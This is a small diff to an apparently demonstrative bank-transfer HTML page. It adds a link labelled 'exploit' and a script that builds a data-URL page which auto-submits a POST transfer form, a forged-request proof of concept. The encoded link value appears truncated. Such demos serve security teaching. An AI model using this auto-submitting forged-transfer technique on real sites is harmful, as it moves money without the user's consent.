@@ -9,3 +9,8 @@
 	Amount:<input type="number" name="amount"> to:<input type="string" name="to"><input type="submit">
 </form>
 </div>
+</br>
+</div>
+<a id="exploit" href="data:text/html;base64,PGh0bWw+Cgk8Ym9keT4KCTxmb3JtIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIuL2Jhbmt0cmFuc2ZlciI+CgkJCUFtb3VudDo8aW5wdXQgdHlwZT0ibnVtYmVyIiBuYW1lPSJhbW91bnQiPiB0bzo8aW5wdXQgdHlwZT0ic3RyaW5nIiBuYW1lPSJ0byI+PGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8L2Zvcm0+Cgk8L2JvZHk+CjwvaH">exploit</a>
+<script>document.getElementById("exploit").href='data:text/html;base64,'+btoa('<html><body onload="document.forms[0].submit()"><form method="POST" action="'+document.location.href+'">Amount:<input type="number" value="20" name="amount"> to:<input type="string" name="to"><input type="submit"></form></body></html>')</script>
+</div>
